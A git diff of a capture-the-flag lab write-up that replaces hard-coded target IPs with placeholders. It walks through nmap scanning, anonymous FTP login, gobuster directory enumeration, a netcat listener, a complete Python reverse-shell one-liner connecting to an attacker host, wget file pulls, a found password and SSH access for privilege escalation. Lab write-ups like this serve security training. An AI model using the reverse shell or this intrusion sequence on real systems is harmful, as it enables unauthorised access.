@@ -2,16 +2,17 @@
 
 #### Nmap Scan
 ```bash
- nmap -sV -A 10.48.159.15
+ nmap -sV -A <IP address>
  ```
 
 ![alt text](images/image.png)
 
 #### ftp Access
 ```bash
-ftp 10.48.159.15
+ftp <IP address>
 ```
  username anonymous 
+
  passsword anonymous
 
  ![alt text](images/image-1.png)
@@ -27,10 +28,10 @@ usernames : Anurodh, Apaar
 
 #### Directory Enumeration
 ```bash
-gobuster dir -u http://10.48.159.15 -w /usr/share/wordlists/dirb/common.txt 
+gobuster dir -u http://<IP address> -w /usr/share/wordlists/dirb/common.txt 
 ```
 ```bash
-firefox http://10.49.191.211/secret/
+firefox http://<IP address>/secret/
 ```
 
 ![alt text](images/image-3.png)
@@ -42,7 +43,7 @@ nc -lvnp 9001
 ```
 ##### Reverse Shell Payload Using Python 
 ```bash
-export RHOST="192.168.157.221";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+export RHOST="<IP address>";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
 ```
 
 use https://www.revshells.com/
@@ -93,12 +94,12 @@ python3 -m http.server
 
 ![alt text](images/image-15.png)
 ```bash
-wget http://10.49.191.211:8000/002d7e638fb463fb7a266f5ffc7ac47d.gif
+wget http://<IP address>:8000/002d7e638fb463fb7a266f5ffc7ac47d.gif
 ```
 
 ![alt text](images/image-13.png)
 ```bash
-wget http://10.49.191.211:8000/hacker-with-laptop_23-2147985341.jpg
+wget http://<IP address>:8000/hacker-with-laptop_23-2147985341.jpg
 ```
 
 ![alt text](images/image-14.png)
@@ -148,7 +149,7 @@ password: pass1word
 ####  Privilege escalation (Anurodh → root)
 ##### SSH access (Anurodh)
 ```bash
-ssh anurodh@10.49.191.211
+ssh anurodh@<IP address>
 ```
   
 ![alt text](images/image-24.png)
